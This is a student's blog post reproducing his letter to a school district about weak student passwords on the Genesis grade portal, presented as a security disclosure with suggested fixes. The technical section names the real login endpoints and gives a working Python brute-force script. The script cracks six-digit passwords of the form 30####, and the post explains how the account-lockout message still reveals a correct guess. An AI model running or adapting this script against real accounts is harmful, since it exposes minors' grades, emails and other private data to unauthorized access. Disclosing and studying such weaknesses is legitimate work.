@Title = School Password Concern
@Author = Connor Slade
@Date = 02-11-22
@Description = How I hacked my school (that caught your attention huh)
@Tags = School, Passwords, Hacking, Genesis
@Path = other/school-password-concern
@Assets = .

---

# 🏫 School Password Concern

<div ad note>
Note

A document I made a while ago (Apr 2021) and sent to my school district addressing the poor student account security.

About 18 days later the school IT person responded saying they have a mechanism in place to limit the number of password retries to 8.
I looked into how they implemented this and found that when an account is tried more than 8 it disables the account...
At first I thought they just shifted the problem because now you could lock people out of their accounts by spamming login attempts.
But I soon realized that it didn't even fix the original problem!

When your login failed it would show an error message. If it was because of an incorrect password this message would _always_ be `"Username or password is incorrect."`.
But if you had a correct passwords but the account was under the 'ratelimit' it would say `"Account is Inactive."`. So you could still tell if the password was correct.

A few months later I rewrote the system in Rust making it like thousands of times faster, often cracking a password in under 30 seconds.

And nothing much has happened since. I hope they fix this because I cant have been the only one to see a problem here.

</div>

<div ad info>
Info

Source Code can be found [here](https://raw.githubusercontent.com/Basicprogrammer10/SchoolPasswordCrack).

</div>

## 🧠 Intro

I am writing to express a concern I have with district password security for the students, as well as to offer some possible solutions to fix this problem.

The [Genesis](https://www.genesisedu.com/) login system has a vulnerability that allows many possible passwords to be tried very quickly.
This could allow someone to fairly easily guess passwords and gain access to student accounts in a matter of minutes. With access to a student's password, a large amount of personal information is at risk.

## ❓ Why this is a problem

How is this bad? Well with these passwords being used for both Genesis accounts and student Google accounts lots of student's personal information is accessible.
This includes the following (in no particular order)

- Full Name
- Birth Date
- Age
- State ID
- School name
- Grade
- Attendance
- Grades
- Classes
- Teacher names
- Report Cards
- Forms
- Calendar Events
- Class Zoom Links
- Class Times
- Student Assignments
- Student Files
- Student Emails (of all students)
- YouTube Watch & Search history
- Google Search History
- Google Keep stuff
- Chrome Bookmarks
- Chrome Saved Passwords
- Chrome autofill form data
- Chrome currently open tabs
- Chrome History
- Google Photos
- Google Tasks
- Any Phones / Mobile devices signed in with school Google
- Device Details of devices signed in to school Google account
- And more

And this is just the information I found with just a few minutes of searching through my account.
I hope after reading that you are very concerned about the amount of personal information that is basically public (to anyone who cares enough to put a small amount of effort and time into it).
Now not only does anybody who cracks someone else's passwords have access to read the information contained in the categories mentioned above, but they can also edit/modify/send information/emails as someone else.

## ✨ Fixes

Now that this problem is known, it wouldn't be very helpful if I didn't suggest some fixes!
So here are two simple options to think about.

### 📀 Option 1

One fix for this problem is to use more secure passwords for accounts.
Currently, a large amount (not all) of student passwords appear to be formatted like this ⇒ `30####` where the `#`s are any number.
This means that for many student passwords only four digits need to be cracked.
This is bad because it lowers the time to crack passwords.
I have been able to crack my own password with some relatively simple [code](https://github.com/Basicprogrammer10/SchoolPasswordCrack/blob/master/src/SchoolPasswordCrack.py) in only a few minutes.
This means all student passwords could be cracked in a few weeks or less for over 7000 accounts.

I think that at a certain grade (I would say 6th grade) students could learn how to then make their own secure passwords.
Secure passwords have 10 characters made up of letters, numbers, and special characters.
These passwords should not be able to be seen by teachers or other staff but could be reset if needed.
This would be good in terms of security, but it will also teach students the important skill of making secure passwords.

### 💿 Option 2

Another way to fix this problem is by making some modifications to the Genesis login system.
This is something that would require working with the Genesis 'team' to fix but would be _ok_ if option 1 is not viable.

Currently, Genesis has no rate limit or CAPTCHA. This means that many automated password attempts can be made within very quick succession.
For example, the program mentioned above was able to make over 30 requests per second.
This allows simple brute force attacks (such as this one) to work.
Nowadays fixing this is extremely easy with the use of external services like reCAPTCHA.

### 🌠 Fixes Conclusion

There are of course more options than these two, but I think this is a good start and will hopefully get the district to think more about the security aspect of the services used.
Apart, these solutions are ok but if both are used together the school and its students will be made more secure than ever.

## 🛑 Conclusion

Personal information has become an incredibly valuable asset for advertisers, hackers, etc. it is now more important than ever to properly secure it.
At the moment I believe the district is **not** doing enough to secure this information, which places large amounts of personal protected student data at risk.
I believe that it is the district's responsibility to securely manage student's data on required sites and services (like Google Classroom and Genesis).

By reading this our district is one step closer to better security!
As I hope you can see from reading this, I really care about security and want to improve the school's technology for not only myself but all other students.
I will also be happy to discuss my thoughts and findings in more detail if It would be helpful.

Sincerely, Connor

## 📅 Technical Details (If you are interested)

Here I will be going over some specific technical details of this vulnerability. View the advanced version's [code](https://github.com/Basicprogrammer10/SchoolPasswordCrack/blob/master/src/SchoolPasswordCrack.py) and see it in action [here](https://asciinema.org/a/408164).
This vulnerability can be exploited manually if you have a lot of time but can be sped up immensely with a bit of code.

At its most basic my script just sends a GET request to `https://parents.genesisedu.com/SCHOOL_PAGE/sis/view` to get the `JSESSIONID` cookie assigned by the server.
Then it sends POST requests to `https://parents.genesisedu.com/SCHOOL_PAGE/sis/j_security_check` with the form data `{"j_password": <PASSWORD>, "j_username": <EMAIL>}` where `<PASSWORD>` is the password to try (ex: 307652 or 300936) and `<EMAIL>` is the email of the account to crack.
I found these details by looking at the site's network traffic when logging into my account.

Below you can see a basic python script that will (slowly) crack a password for the supplied email account.
Code comments are included to help show what each line does.

```python
import requests  # Import needed module

url      = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/j_security_check'  # Define api uri
checkUrl = 'https://parents.genesisedu.com/SCHOOL_PAGE/sis/view?gohome=true'  # Define defult url

# Put student Email here (ex: example@domain.com)
email = ''

assert email != '' # Dont run if email is empty
print(f'[*] Starting Crack for {email}')  # Print email to crack

for i in range(9999):  # Loop through possible passwords
    toTry = f'30{str(i).zfill(4)}'  # Create password to try (ex: 300736)
    print(f'[*] Trying [{toTry}]')  # print what password is being tried

    # Create new session to hold cookies
    ses = requests.Session()

    # Let server Create cookies needed to proform exploit (JSESSIONID)
    ses.get(checkUrl)

    # Get Data to send
    dataToSend = {"j_password": toTry, "j_username": email}

    # Try Password
    data = ses.post(url, data=dataToSend)

    # Check if is correct password
    if not "Account is inactive" in data.text and not "workStudentId" in data.text:
        continue
    print(f'\n[*] Complete: {toTry}')  # if passwords is correct print it
    break  # Exit the loop when the password has been found
```

Watch this script run [here](https://asciinema.org/a/408162). Now this works but is still very slow, however, it does a good job showing what is going on without optimizations.
To speed this up multi-threading can be used to attempt more passwords in the same amount of time.
